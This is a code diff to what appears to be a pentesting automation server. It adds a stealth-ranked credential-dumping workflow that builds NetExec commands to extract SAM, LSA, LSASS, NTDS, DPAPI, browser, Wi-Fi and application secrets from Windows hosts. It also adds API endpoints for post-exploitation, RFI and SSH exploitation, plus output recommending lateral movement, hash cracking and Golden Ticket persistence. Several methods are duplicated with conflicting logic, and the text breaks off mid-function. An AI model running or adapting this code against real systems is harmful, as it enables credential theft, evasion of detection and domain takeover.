+        # Generate recommendations
+        recommendations = [
+            "Implement key-based authentication",
+            "Disable password authentication if possible",
+            "Use fail2ban or similar protection",
+            "Regular security updates for SSH service",
+            "Monitor SSH logs for suspicious activity"
+        ]
+
+        if vuln_results.get("misconfigurations"):
+            recommendations.extend([
+                "Review SSH configuration for security hardening",
+                "Disable root login via SSH",
+                "Implement IP-based access controls"
+            ])
+
+        summary["recommendations"] = recommendations
+
+        return summary
+
 class EnhancedProcessManager:
     """Advanced process management with intelligent resource allocation"""
 
@@ -6289,6 +7280,696 @@ class CVEIntelligenceManager:
         self.cve_cache = {}
         self.vulnerability_db = {}
         self.threat_intelligence = {}
+        self.credential_cache = {}  # Add credential caching system
+        self.post_exploit_modules = self._initialize_post_exploit_modules()
+
+    def _initialize_post_exploit_modules(self):
+        """Initialize post-exploitation credential dumping modules"""
+        return {
+            "windows_credentials": {
+                "sam": {"priority": 10, "stealth": "medium", "requires_admin": True, "opsec_risk": "medium"},
+                "lsa": {"priority": 9, "stealth": "medium", "requires_admin": True, "opsec_risk": "medium"},
+                "lsass": {"priority": 10, "stealth": "low", "requires_admin": True, "opsec_risk": "high"},
+                "lsassy": {"priority": 10, "stealth": "medium", "requires_admin": True, "opsec_risk": "medium"},
+                "nanodump": {"priority": 9, "stealth": "high", "requires_admin": True, "opsec_risk": "low"},
+                "dpapi": {"priority": 8, "stealth": "high", "requires_admin": False, "opsec_risk": "low"},
+                "ntds": {"priority": 10, "stealth": "low", "requires_domain_admin": True, "opsec_risk": "high"},
+                "gmsa": {"priority": 7, "stealth": "high", "requires_admin": False, "opsec_risk": "low"},
+                "laps": {"priority": 8, "stealth": "medium", "requires_admin": True, "opsec_risk": "medium"},
+                "reg_winlogon": {"priority": 6, "stealth": "high", "requires_admin": False, "opsec_risk": "low"}
+            },
+            "application_credentials": {
+                "mremoteng": {"priority": 6, "stealth": "high", "file_locations": ["%APPDATA%\\mRemoteNG\\confCons.xml"], "opsec_risk": "low"},
+                "putty": {"priority": 5, "stealth": "high", "registry_keys": ["HKCU\\Software\\SimonTatham\\PuTTY\\Sessions"], "opsec_risk": "low"},
+                "chrome": {"priority": 7, "stealth": "medium", "file_locations": ["%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data"], "opsec_risk": "low"},
+                "notepadpp": {"priority": 4, "stealth": "high", "file_locations": ["%APPDATA%\\Notepad++\\backup\\"], "opsec_risk": "low"},
+                "wifi": {"priority": 6, "stealth": "medium", "requires_admin": True, "opsec_risk": "low"},
+                "vnc": {"priority": 5, "stealth": "high", "registry_keys": ["HKLM\\SOFTWARE\\ORL\\WinVNC3\\Password"], "opsec_risk": "low"},
+                "winscp": {"priority": 5, "stealth": "high", "file_locations": ["%APPDATA%\\WinSCP\\WinSCP.ini"], "opsec_risk": "low"}
+            },
+            "system_intelligence": {
+                "powershell_history": {"priority": 5, "stealth": "high", "file_locations": ["%APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"], "opsec_risk": "low"},
+                "certificates": {"priority": 6, "stealth": "medium", "requires_admin": False, "opsec_risk": "low"},
+                "backup_operators": {"priority": 9, "stealth": "low", "requires_group_membership": "Backup Operators", "opsec_risk": "high"}
+            }
+        }
+
+    def execute_credential_dumping_workflow(self, target_host, credentials=None, stealth_level="medium"):
+        """Execute comprehensive credential dumping workflow"""
+        workflow_results = {
+            "target": target_host,
+            "stealth_level": stealth_level,
+            "credentials_found": [],
+            "modules_executed": [],
+            "failed_modules": [],
+            "recommendations": []
+        }
+
+        logger.info(f"⚡ Starting credential dumping workflow for {target_host}")
+
+        # Phase 1: Windows Credential Extraction (if admin access)
+        if credentials and credentials.get("admin_access"):
+            workflow_results.update(self._execute_windows_credential_modules(target_host, credentials, stealth_level))
+
+        # Phase 2: Application Credential Mining (lower privilege)
+        workflow_results.update(self._execute_application_credential_modules(target_host, credentials, stealth_level))
+
+        # Phase 3: System Intelligence Gathering
+        workflow_results.update(self._execute_system_intelligence_modules(target_host, credentials, stealth_level))
+
+        # Phase 4: Post-processing and correlation
+        workflow_results["summary"] = self._correlate_credential_findings(workflow_results)
+
+        return workflow_results
+
+    def _execute_windows_credential_modules(self, target_host, credentials, stealth_level):
+        """Execute Windows-specific credential dumping modules"""
+        results = {"windows_modules": []}
+
+        priority_modules = sorted(
+            self.post_exploit_modules["windows_credentials"].items(),
+            key=lambda x: x[1]["priority"],
+            reverse=True
+        )
+
+        for module_name, module_config in priority_modules:
+            if self._should_execute_module(module_config, stealth_level):
+                module_result = self._execute_netexec_credential_module(
+                    target_host, module_name, credentials, module_config
+                )
+                results["windows_modules"].append(module_result)
+
+                # Cache successful credential extractions
+                if module_result.get("success") and module_result.get("credentials"):
+                    self._cache_extracted_credentials(module_name, module_result["credentials"])
+
+        return results
+
+    def _should_execute_module(self, module_config, stealth_level):
+        """Determine if module should be executed based on stealth requirements and OPSEC"""
+        stealth_mapping = {"high": 3, "medium": 2, "low": 1}
+        opsec_mapping = {"low": 3, "medium": 2, "high": 1}
+
+        current_stealth = stealth_mapping.get(stealth_level, 2)
+        module_stealth = stealth_mapping.get(module_config.get("stealth", "medium"), 2)
+        module_opsec = opsec_mapping.get(module_config.get("opsec_risk", "medium"), 2)
+
+        # Only execute if module stealth level is acceptable and OPSEC risk is manageable
+        return module_stealth >= current_stealth and module_opsec >= current_stealth
+
+    def _execute_application_credential_modules(self, target_host, credentials, stealth_level):
+        """Execute application-specific credential dumping modules"""
+        results = {"application_modules": []}
+
+        priority_modules = sorted(
+            self.post_exploit_modules["application_credentials"].items(),
+            key=lambda x: x[1]["priority"],
+            reverse=True
+        )
+
+        for module_name, module_config in priority_modules:
+            if self._should_execute_module(module_config, stealth_level):
+                module_result = self._execute_netexec_credential_module(
+                    target_host, module_name, credentials, module_config
+                )
+                results["application_modules"].append(module_result)
+
+                # Cache successful credential extractions
+                if module_result.get("success") and module_result.get("credentials"):
+                    self._cache_extracted_credentials(module_name, module_result["credentials"])
+
+        return results
+
+    def _execute_system_intelligence_modules(self, target_host, credentials, stealth_level):
+        """Execute system intelligence gathering modules"""
+        results = {"intelligence_modules": []}
+
+        priority_modules = sorted(
+            self.post_exploit_modules["system_intelligence"].items(),
+            key=lambda x: x[1]["priority"],
+            reverse=True
+        )
+
+        for module_name, module_config in priority_modules:
+            if self._should_execute_module(module_config, stealth_level):
+                module_result = self._execute_netexec_credential_module(
+                    target_host, module_name, credentials, module_config
+                )
+                results["intelligence_modules"].append(module_result)
+
+                # Cache intelligence findings
+                if module_result.get("success") and module_result.get("intelligence"):
+                    self._cache_intelligence_data(module_name, module_result["intelligence"])
+
+        return results
+
+    def _correlate_credential_findings(self, workflow_results):
+        """Correlate and analyze credential findings across all modules"""
+        summary = {
+            "total_modules_executed": 0,
+            "successful_modules": 0,
+            "total_credentials_found": 0,
+            "high_value_targets": [],
+            "credential_reuse_detected": False,
+            "domain_admin_access": False,
+            "persistence_opportunities": [],
+            "opsec_warnings": []
+        }
+
+        all_modules = []
+        if "windows_modules" in workflow_results:
+            all_modules.extend(workflow_results["windows_modules"])
+        if "application_modules" in workflow_results:
+            all_modules.extend(workflow_results["application_modules"])
+        if "intelligence_modules" in workflow_results:
+            all_modules.extend(workflow_results["intelligence_modules"])
+
+        summary["total_modules_executed"] = len(all_modules)
+        summary["successful_modules"] = len([m for m in all_modules if m.get("success")])
+
+        # Analyze credentials for high-value targets
+        all_credentials = []
+        for module in all_modules:
+            if module.get("credentials"):
+                all_credentials.extend(module["credentials"])
+
+        summary["total_credentials_found"] = len(all_credentials)
+
+        # Detect domain admin or high-privilege accounts
+        high_value_indicators = ["administrator", "admin", "domain admin", "enterprise admin", "krbtgt"]
+        for cred in all_credentials:
+            username = cred.get("username", "").lower()
+            if any(indicator in username for indicator in high_value_indicators):
+                summary["high_value_targets"].append(cred)
+                if "domain admin" in username or "krbtgt" in username:
+                    summary["domain_admin_access"] = True
+
+        # Detect credential reuse
+        usernames = [cred.get("username") for cred in all_credentials if cred.get("username")]
+        if len(usernames) != len(set(usernames)):
+            summary["credential_reuse_detected"] = True
+
+        # Identify persistence opportunities
+        if any(m.get("module") == "lsass" and m.get("success") for m in all_modules):
+            summary["persistence_opportunities"].append("LSASS dump successful - Golden Ticket possible")
+        if any(m.get("module") == "ntds" and m.get("success") for m in all_modules):
+            summary["persistence_opportunities"].append("NTDS.dit extracted - Domain persistence possible")
+
+        # OPSEC warnings for high-risk modules
+        high_risk_modules = [m for m in all_modules if m.get("stealth_rating") == "low" and m.get("success")]
+        if high_risk_modules:
+            summary["opsec_warnings"].append(f"Executed {len(high_risk_modules)} high-risk modules - consider EDR detection")
+
+        return summary
+
+    def _cache_extracted_credentials(self, module_name, credentials):
+        """Cache extracted credentials for correlation and reuse"""
+        cache_key = f"credentials_{module_name}_{datetime.now().strftime('%Y%m%d')}"
+        self.credential_cache[cache_key] = {
+            "module": module_name,
+            "timestamp": datetime.now().isoformat(),
+            "credentials": credentials,
+            "quality_score": self._calculate_credential_quality(credentials)
+        }
+
+        # Cleanup old cache entries (keep only last 7 days)
+        cutoff_date = datetime.now() - timedelta(days=7)
+        self.credential_cache = {
+            k: v for k, v in self.credential_cache.items()
+            if datetime.fromisoformat(v["timestamp"]) > cutoff_date
+        }
+
+    def _cache_intelligence_data(self, module_name, intelligence):
+        """Cache intelligence data for analysis"""
+        cache_key = f"intel_{module_name}_{datetime.now().strftime('%Y%m%d')}"
+        self.credential_cache[cache_key] = {
+            "module": module_name,
+            "timestamp": datetime.now().isoformat(),
+            "intelligence": intelligence,
+            "actionable": self._assess_intelligence_value(intelligence)
+        }
+
+    def _calculate_credential_quality(self, credentials):
+        """Calculate quality score for extracted credentials"""
+        if not credentials:
+            return 0
+
+        quality_score = 0
+        for cred in credentials:
+            # Base score
+            quality_score += 1
+
+            # Bonus for admin accounts
+            username = cred.get("username", "").lower()
+            if "admin" in username:
+                quality_score += 2
+
+            # Bonus for domain accounts
+            if "\\" in cred.get("username", "") or "@" in cred.get("username", ""):
+                quality_score += 1
+
+            # Bonus for cleartext passwords
+            if cred.get("password") and not cred.get("hash_only"):
+                quality_score += 1
+
+        return min(quality_score, 10)  # Cap at 10
+
+    def _assess_intelligence_value(self, intelligence):
+        """Assess actionable value of intelligence data"""
+        if not intelligence:
+            return False
+
+        # Check for indicators of high-value intelligence
+        high_value_indicators = [
+            "password", "credential", "secret", "token",
+            "api_key", "database", "admin", "root"
+        ]
+
+        intelligence_text = str(intelligence).lower()
+        return any(indicator in intelligence_text for indicator in high_value_indicators)
+
+    def _execute_netexec_credential_module(self, target_host, module_name, credentials, module_config):
+        """Execute specific NetExec credential dumping module"""
+        try:
+            # Build NetExec command based on module type
+            netexec_commands = {
+                # Windows Credential Access
+                "sam": f"nxc smb {target_host} -u {credentials['username']} -p {credentials['password']} --sam",
+                "lsa": f"nxc smb {target_host} -u {credentials['username']} -p {credentials['password']} --lsa",
+                "lsass": f"nxc smb {target_host} -u {credentials['username']} -p {credentials['password']} -M lsassy",
+                "lsassy": f"nxc smb {target_host} -u {credentials['username']} -p {credentials['password']} -M lsassy",
+                "nanodump": f"nxc smb {target_host} -u {credentials['username']} -p {credentials['password']} -M nanodump",
+                "dpapi": f"nxc smb {target_host} -u {credentials['username']} -p {credentials['password']} --dpapi",
+                "ntds": f"nxc smb {target_host} -u {credentials['username']} -p {credentials['password']} --ntds",
+                "gmsa": f"nxc ldap {target_host} -u {credentials['username']} -p {credentials['password']} --gmsa",
+                "laps": f"nxc ldap {target_host} -u {credentials['username']} -p {credentials['password']} -M laps",
+                "reg_winlogon": f"nxc smb {target_host} -u {credentials['username']} -p {credentials['password']} -M reg-winlogon",
+
+                # Application Credential Mining
+                "mremoteng": f"nxc smb {target_host} -u {credentials['username']} -p {credentials['password']} -M mremoteng",
+                "putty": f"nxc smb {target_host} -u {credentials['username']} -p {credentials['password']} -M putty",
+                "chrome": f"nxc smb {target_host} -u {credentials['username']} -p {credentials['password']} -M dpapi",
+                "notepadpp": f"nxc smb {target_host} -u {credentials['username']} -p {credentials['password']} -M notepad++",
+                "wifi": f"nxc smb {target_host} -u {credentials['username']} -p {credentials['password']} -M wifi",
+                "vnc": f"nxc smb {target_host} -u {credentials['username']} -p {credentials['password']} -M vnc",
+                "winscp": f"nxc smb {target_host} -u {credentials['username']} -p {credentials['password']} -M winscp",
+
+                # System Intelligence
+                "powershell_history": f"nxc smb {target_host} -u {credentials['username']} -p {credentials['password']} -M powershell_history",
+                "certificates": f"nxc smb {target_host} -u {credentials['username']} -p {credentials['password']} -M certificates",
+                "backup_operators": f"nxc smb {target_host} -u {credentials['username']} -p {credentials['password']} -M backup_operator"
+            }
+
+            command = netexec_commands.get(module_name)
+            if not command:
+                return {"module": module_name, "success": False, "error": "Unknown module"}
+
+            logger.info(f"🔓 Executing {module_name} credential extraction on {target_host}")
+
+            # Execute via AdvancedProcessManager for proper monitoring
+            result = AdvancedProcessManager.execute_with_monitoring(
+                command=command,
+                timeout=300,  # 5 minute timeout
+                capture_output=True
+            )
+
+            # Parse credential extraction results
+            parsed_credentials = self._parse_credential_output(module_name, result.get("output", ""))
+
+            return {
+                "module": module_name,
+                "success": result.get("success", False),
+                "credentials": parsed_credentials,
+                "raw_output": result.get("output", ""),
+                "execution_time": result.get("duration", 0),
+                "stealth_rating": module_config["stealth"]
+            }
+
+        except Exception as e:
+            logger.error(f"💥 Error executing {module_name} module: {str(e)}")
+            return {"module": module_name, "success": False, "error": str(e)}
+
+    def _parse_credential_output(self, module_name, raw_output):
+        """Parse credentials from NetExec module output"""
+        credentials = []
+
+        if module_name in ["sam", "lsa"]:
+            # Parse NTLM hashes from SAM/LSA output
+            import re
+            hash_pattern = r'([^:]+):(\d+):([a-fA-F0-9]{32}):([a-fA-F0-9]{32}):::'
+            matches = re.findall(hash_pattern, raw_output)
+
+            for match in matches:
+                credentials.append({
+                    "type": "ntlm_hash",
+                    "username": match[0],
+                    "uid": match[1],
+                    "lm_hash": match[2],
+                    "nt_hash": match[3],
+                    "source": module_name
+                })
+
+        elif module_name == "lsass":
+            # Parse lsassy output for cleartext passwords and hashes
+            lines = raw_output.split('\n')
+            for line in lines:
+                if "Password:" in line and "Username:" in line:
+                    # Extract cleartext credentials
+                    parts = line.split()
+                    username = next((p.split(':')[1] for p in parts if p.startswith('Username:')), '')
+                    password = next((p.split(':')[1] for p in parts if p.startswith('Password:')), '')
+
+                    if username and password:
+                        credentials.append({
+                            "type": "cleartext",
+                            "username": username,
+                            "password": password,
+                            "source": "lsass_memory"
+                        })
+
+        elif module_name == "dpapi":
+            # Parse DPAPI masterkey information
+            if "DPAPI" in raw_output and "masterkey" in raw_output.lower():
+                credentials.append({
+                    "type": "dpapi_masterkey",
+                    "data": raw_output,
+                    "source": "dpapi_extraction"
+                })
+
+        return credentials
+
+    def _should_execute_module(self, module_config, stealth_level):
+        """Determine if module should be executed based on stealth requirements"""
+        stealth_ratings = {"high": 3, "medium": 2, "low": 1}
+
+        module_stealth = stealth_ratings.get(module_config["stealth"], 2)
+        required_stealth = stealth_ratings.get(stealth_level, 2)
+
+        return module_stealth >= required_stealth
+
+    def _cache_extracted_credentials(self, module_name, credentials):
+        """Cache extracted credentials for correlation and reuse"""
+        cache_key = f"{module_name}_{int(time.time())}"
+        self.credential_cache[cache_key] = {
+            "module": module_name,
+            "credentials": credentials,
+            "timestamp": time.time(),
+            "processed": False
+        }
+
+        logger.info(f"💾 Cached {len(credentials)} credentials from {module_name}")
+
+    def _execute_application_credential_modules(self, target_host, credentials, stealth_level):
+        """Execute application-specific credential mining modules"""
+        results = {"application_modules": []}
+
+        for module_name, module_config in self.post_exploit_modules["application_credentials"].items():
+            if self._should_execute_module(module_config, stealth_level):
+                # Execute application credential module
+                if module_name == "mremoteng":
+                    module_result = self._execute_mremoteng_extraction(target_host, credentials)
+                elif module_name == "chrome":
+                    module_result = self._execute_chrome_extraction(target_host, credentials)
+                elif module_name == "wifi":
+                    module_result = self._execute_wifi_extraction(target_host, credentials)
+                else:
+                    module_result = self._execute_generic_app_module(target_host, module_name, credentials, module_config)
+
+                results["application_modules"].append(module_result)
+
+        return results
+
+    def _execute_system_intelligence_modules(self, target_host, credentials, stealth_level):
+        """Execute system intelligence gathering modules"""
+        results = {"system_modules": []}
+
+        for module_name, module_config in self.post_exploit_modules["system_intelligence"].items():
+            if self._should_execute_module(module_config, stealth_level):
+                if module_name == "powershell_history":
+                    module_result = self._execute_powershell_history(target_host, credentials)
+                elif module_name == "certificates":
+                    module_result = self._execute_certificate_extraction(target_host, credentials)
+                else:
+                    module_result = self._execute_generic_system_module(target_host, module_name, credentials, module_config)
+
+                results["system_modules"].append(module_result)
+
+        return results
+
+    def _execute_mremoteng_extraction(self, target_host, credentials):
+        """Extract mRemoteNG connection credentials"""
+        try:
+            command = f"nxc smb {target_host} -u {credentials['username']} -p {credentials.get('password', '')} -M mremoteng"
+
+            result = AdvancedProcessManager.execute_with_monitoring(
+                command=command,
+                timeout=120,
+                capture_output=True
+            )
+
+            parsed_creds = []
+            if result.get("success") and "mRemoteNG" in result.get("output", ""):
+                # Parse mRemoteNG XML output for connection credentials
+                output_lines = result.get("output", "").split('\n')
+                for line in output_lines:
+                    if "Username:" in line and "Password:" in line:
+                        parsed_creds.append({
+                            "type": "mremoteng_connection",
+                            "data": line.strip(),
+                            "source": "mremoteng_confcons"
+                        })
+
+            return {
+                "module": "mremoteng",
+                "success": result.get("success", False),
+                "credentials": parsed_creds,
+                "execution_time": result.get("duration", 0)
+            }
+
+        except Exception as e:
+            return {"module": "mremoteng", "success": False, "error": str(e)}
+
+    def _execute_chrome_extraction(self, target_host, credentials):
+        """Extract Chrome saved passwords via DPAPI"""
+        try:
+            command = f"nxc smb {target_host} -u {credentials['username']} -p {credentials.get('password', '')} -M dpapi"
+
+            result = AdvancedProcessManager.execute_with_monitoring(
+                command=command,
+                timeout=180,
+                capture_output=True
+            )
+
+            parsed_creds = []
+            if result.get("success"):
+                # Parse DPAPI output for browser credentials
+                output = result.get("output", "")
+                if "chrome" in output.lower() or "login data" in output.lower():
+                    parsed_creds.append({
+                        "type": "browser_password",
+                        "browser": "chrome",
+                        "data": output,
+                        "source": "dpapi_chrome"
+                    })
+
+            return {
+                "module": "chrome_dpapi",
+                "success": result.get("success", False),
+                "credentials": parsed_creds,
+                "execution_time": result.get("duration", 0)
+            }
+
+        except Exception as e:
+            return {"module": "chrome_dpapi", "success": False, "error": str(e)}
+
+    def _execute_wifi_extraction(self, target_host, credentials):
+        """Extract Wi-Fi passwords"""
+        try:
+            command = f"nxc smb {target_host} -u {credentials['username']} -p {credentials.get('password', '')} -M wifi"
+
+            result = AdvancedProcessManager.execute_with_monitoring(
+                command=command,
+                timeout=120,
+                capture_output=True
+            )
+
+            parsed_creds = []
+            if result.get("success"):
+                # Parse Wi-Fi credential output
+                output_lines = result.get("output", "").split('\n')
+                for line in output_lines:
+                    if "SSID:" in line and "Password:" in line:
+                        parsed_creds.append({
+                            "type": "wifi_password",
+                            "data": line.strip(),
+                            "source": "windows_wifi_profiles"
+                        })
+
+            return {
+                "module": "wifi",
+                "success": result.get("success", False),
+                "credentials": parsed_creds,
+                "execution_time": result.get("duration", 0)
+            }
+
+        except Exception as e:
+            return {"module": "wifi", "success": False, "error": str(e)}
+
+    def _execute_powershell_history(self, target_host, credentials):
+        """Extract PowerShell command history"""
+        try:
+            # Use custom PowerShell command to read history file
+            ps_command = "Get-Content $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt -ErrorAction SilentlyContinue"
+
+            # Execute via NetExec or direct PS execution
+            command = f"nxc smb {target_host} -u {credentials['username']} -p {credentials.get('password', '')} -x '{ps_command}'"
+
+            result = AdvancedProcessManager.execute_with_monitoring(
+                command=command,
+                timeout=60,
+                capture_output=True
+            )
+
+            parsed_intel = []
+            if result.get("success"):
+                history_content = result.get("output", "")
+                # Look for potential credentials in PowerShell history
+                sensitive_patterns = [
+                    "password", "pwd", "credential", "secret", "token", "key"
+                ]
+
+                for line in history_content.split('\n'):
+                    if any(pattern in line.lower() for pattern in sensitive_patterns):
+                        parsed_intel.append({
+                            "type": "powershell_history",
+                            "command": line.strip(),
+                            "source": "ps_history"
+                        })
+
+            return {
+                "module": "powershell_history",
+                "success": result.get("success", False),
+                "intelligence": parsed_intel,
+                "execution_time": result.get("duration", 0)
+            }
+
+        except Exception as e:
+            return {"module": "powershell_history", "success": False, "error": str(e)}
+
+    def _execute_certificate_extraction(self, target_host, credentials):
+        """Extract certificate store credentials"""
+        try:
+            command = f"nxc smb {target_host} -u {credentials['username']} -p {credentials.get('password', '')} -M certificates"
+
+            result = AdvancedProcessManager.execute_with_monitoring(
+                command=command,
+                timeout=120,
+                capture_output=True
+            )
+
+            parsed_certs = []
+            if result.get("success"):
+                # Parse certificate output
+                output = result.get("output", "")
+                if "certificate" in output.lower():
+                    parsed_certs.append({
+                        "type": "certificate_store",
+                        "data": output,
+                        "source": "windows_cert_store"
+                    })
+
+            return {
+                "module": "certificates",
+                "success": result.get("success", False),
+                "certificates": parsed_certs,
+                "execution_time": result.get("duration", 0)
+            }
+
+        except Exception as e:
+            return {"module": "certificates", "success": False, "error": str(e)}
+
+    def _execute_generic_app_module(self, target_host, module_name, credentials, module_config):
+        """Execute generic application credential module"""
+        try:
+            command = f"nxc smb {target_host} -u {credentials['username']} -p {credentials.get('password', '')} -M {module_name}"
+
+            result = AdvancedProcessManager.execute_with_monitoring(
+                command=command,
+                timeout=120,
+                capture_output=True
+            )
+
+            return {
+                "module": module_name,
+                "success": result.get("success", False),
+                "raw_output": result.get("output", ""),
+                "execution_time": result.get("duration", 0)
+            }
+
+        except Exception as e:
+            return {"module": module_name, "success": False, "error": str(e)}
+
+    def _execute_generic_system_module(self, target_host, module_name, credentials, module_config):
+        """Execute generic system intelligence module"""
+        try:
+            command = f"nxc smb {target_host} -u {credentials['username']} -p {credentials.get('password', '')} -M {module_name}"
+
+            result = AdvancedProcessManager.execute_with_monitoring(
+                command=command,
+                timeout=120,
+                capture_output=True
+            )
+
+            return {
+                "module": module_name,
+                "success": result.get("success", False),
+                "raw_output": result.get("output", ""),
+                "execution_time": result.get("duration", 0)
+            }
+
+        except Exception as e:
+            return {"module": module_name, "success": False, "error": str(e)}
+
+    def _correlate_credential_findings(self, workflow_results):
+        """Correlate and analyze credential findings"""
+        all_credentials = []
+
+        # Collect all credentials from different modules
+        for module_type in ["windows_modules", "application_modules", "system_modules"]:
+            modules = workflow_results.get(module_type, [])
+            for module_result in modules:
+                credentials = module_result.get("credentials", [])
+                all_credentials.extend(credentials)
+
+        # Analyze credential quality and reuse
+        summary = {
+            "total_credentials": len(all_credentials),
+            "unique_usernames": len(set(cred.get("username", "") for cred in all_credentials if cred.get("username"))),
+            "credential_types": {},
+            "high_value_targets": [],
+            "recommendations": []
+        }
+
+        # Categorize credential types
+        for cred in all_credentials:
+            cred_type = cred.get("type", "unknown")
+            summary["credential_types"][cred_type] = summary["credential_types"].get(cred_type, 0) + 1
+
+        # Identify high-value credentials
+        for cred in all_credentials:
+            if cred.get("type") == "cleartext" and "admin" in cred.get("username", "").lower():
+                summary["high_value_targets"].append(cred)
+
+        # Generate recommendations
+        if summary["total_credentials"] > 0:
+            summary["recommendations"].extend([
+                "Use extracted credentials for lateral movement",
+                "Crack NTLM hashes with hashcat for additional cleartext passwords",
+                "Check for credential reuse across other systems",
+                "Identify service accounts with elevated privileges"
+            ])
+
+        return summary
 
     @staticmethod
     def create_banner():
@@ -12335,6 +14016,106 @@ def netexec():
             "error": f"Server error: {str(e)}"
         }), 500
 
+@app.route("/api/intelligence/credential-dump", methods=["POST"])
+def credential_dump_workflow():
+    """Execute comprehensive credential dumping workflow using NetExec modules"""
+    try:
+        params = request.json
+        target_host = params.get("target_host", "")
+        credentials = params.get("credentials", {})
+        stealth_level = params.get("stealth_level", "medium")
+
+        if not target_host:
+            logger.warning("🎯 Credential dump workflow called without target parameter")
+            return jsonify({
+                "error": "Target host parameter is required"
+            }), 400
+
+        if not credentials or not credentials.get("username"):
+            logger.warning("🔐 Credential dump workflow called without valid credentials")
+            return jsonify({
+                "error": "Valid credentials (username/password or hash) are required"
+            }), 400
+
+        logger.info(f"⚡ Starting credential dumping workflow for {target_host}")
+
+        # Initialize CVE Intelligence Manager for credential operations
+        cve_manager = CVEIntelligenceManager()
+
+        # Execute comprehensive credential dumping workflow
+        workflow_results = cve_manager.execute_credential_dumping_workflow(
+            target_host=target_host,
+            credentials=credentials,
+            stealth_level=stealth_level
+        )
+
+        # Format results using ModernVisualEngine
+        formatted_results = {
+            "success": True,
+            "target": target_host,
+            "stealth_level": stealth_level,
+            "workflow_summary": workflow_results.get("summary", {}),
+            "credentials_extracted": len(workflow_results.get("credentials_found", [])),
+            "modules_executed": len(workflow_results.get("modules_executed", [])),
+            "failed_modules": len(workflow_results.get("failed_modules", [])),
+            "recommendations": workflow_results.get("recommendations", []),
+            "full_results": workflow_results,
+            "visual_output": ModernVisualEngine.format_vulnerability_card({
+                "name": f"Credential Dumping Results - {target_host}",
+                "severity": "critical" if workflow_results.get("credentials_found") else "low",
+                "description": f"Extracted {len(workflow_results.get('credentials_found', []))} credential sets using {len(workflow_results.get('modules_executed', []))} modules"
+            })
+        }
+
+        logger.info(f"✅ Credential dumping workflow completed: {formatted_results['credentials_extracted']} credentials found")
+        return jsonify(formatted_results)
+
+    except Exception as e:
+        logger.error(f"💥 Error in credential dump workflow: {str(e)}")
+        return jsonify({
+            "error": f"Credential dumping failed: {str(e)}",
+            "success": False
+        }), 500
+
+@app.route("/api/intelligence/post-exploitation", methods=["POST"])
+def post_exploitation_workflow():
+    """Create post-exploitation workflow plan using NetExec modules"""
+    try:
+        params = request.json
+        target_host = params.get("target_host", "")
+        credentials = params.get("credentials", {})
+        stealth_level = params.get("stealth_level", "medium")
+
+        if not target_host:
+            return jsonify({"error": "Target host parameter is required"}), 400
+
+        logger.info(f"🎯 Creating post-exploitation workflow for {target_host}")
+
+        # Create comprehensive workflow plan
+        workflow_plan = bugbounty_manager.create_post_exploitation_workflow(
+            target_host=target_host,
+            credentials=credentials,
+            stealth_level=stealth_level
+        )
+
+        logger.info(f"📋 Post-exploitation workflow created: {workflow_plan['tools_count']} tools, {workflow_plan['estimated_time']}s estimated")
+        return jsonify({
+            "success": True,
+            "workflow": workflow_plan,
+            "visual_output": ModernVisualEngine.create_section_header(
+                f"Post-Exploitation Workflow - {target_host}",
+                "🔓",
+                "HACKER_RED"
+            )
+        })
+
+    except Exception as e:
+        logger.error(f"💥 Error creating post-exploitation workflow: {str(e)}")
+        return jsonify({
+            "error": f"Workflow creation failed: {str(e)}",
+            "success": False
+        }), 500
+
 @app.route("/api/tools/amass", methods=["POST"])
 def amass():
     """Execute Amass for subdomain enumeration with enhanced logging"""
@@ -16026,6 +17807,208 @@ def js_intelligence_tool():
         return jsonify({
             "error": f"Server error: {str(e)}"
         }), 500
+
+# ============================================================================
+# NEW EXPLOITATION ENGINES API ENDPOINTS
+# ============================================================================
+
+@app.route("/api/intelligence/rfi-assessment", methods=["POST"])
+def rfi_comprehensive_assessment():
+    """Execute comprehensive RFI assessment using Commander Locke's engine"""
+    try:
+        params = request.json
+        target_url = params.get("target_url", "")
+        parameters = params.get("parameters")
+
+        if not target_url:
+            logger.warning("🎖️ RFI assessment called without target parameter")
+            return jsonify({
+                "error": "Target URL parameter is required"
+            }), 400
+
+        # Initialize RFI Exploiter
+        rfi_exploiter = AdvancedRFIExploiter()
+
+        # Execute comprehensive assessment
+        assessment_results = rfi_exploiter.comprehensive_rfi_assessment(target_url, parameters)
+
+        logger.info(f"🔥 Commander Locke: RFI assessment completed for {target_url}")
+
+        return jsonify({
+            "success": True,
+            "assessment_results": assessment_results,
+            "engine": "AdvancedRFIExploiter",
+            "agent": "Commander Locke"
+        })
+
+    except Exception as e:
+        logger.error(f"💥 RFI assessment error: {str(e)}")
+        return jsonify({
+            "error": f"RFI assessment failed: {str(e)}"
+        }), 500
+
+@app.route("/api/intelligence/ssh-assessment", methods=["POST"])
+def ssh_comprehensive_assessment():
+    """Execute comprehensive SSH assessment using Neo's engine"""
+    try:
+        params = request.json
+        target_host = params.get("target_host", "")
+        credentials = params.get("credentials")
+
+        if not target_host:
+            logger.warning("🎯 SSH assessment called without target parameter")
+            return jsonify({
+                "error": "Target host parameter is required"
+            }), 400
+
+        # Initialize SSH Exploitation Engine
+        ssh_engine = SSHExploitationEngine(intelligent_decision_engine)
+
+        # Execute comprehensive assessment
+        assessment_results = ssh_engine.comprehensive_ssh_assessment(target_host, credentials)
+
+        logger.info(f"⚡ Neo: SSH assessment completed for {target_host}")
+
+        return jsonify({
+            "success": True,
+            "assessment_results": assessment_results,
+            "engine": "SSHExploitationEngine",
+            "agent": "Neo",
+            "mitre_attack_mapping": assessment_results.get("mitre_attack_mapping", [])
+        })
+
+    except Exception as e:
+        logger.error(f"💥 SSH assessment error: {str(e)}")
+        return jsonify({
+            "error": f"SSH assessment failed: {str(e)}"
+        }), 500
+
+@app.route("/api/intelligence/multi-exploit-workflow", methods=["POST"])
+def multi_exploitation_workflow():
+    """Execute integrated multi-technique exploitation workflow"""
+    try:
+        params = request.json
+        target = params.get("target", "")
+        workflow_type = params.get("workflow_type", "comprehensive")
+        credentials = params.get("credentials")
+
+        if not target:
+            logger.warning("🎭 Multi-exploit workflow called without target parameter")
+            return jsonify({
+                "error": "Target parameter is required"
+            }), 400
+
+        workflow_results = {
+            "target": target,
+            "workflow_type": workflow_type,
+            "timestamp": datetime.now().isoformat(),
+            "phases": {},
+            "summary": {}
+        }
+
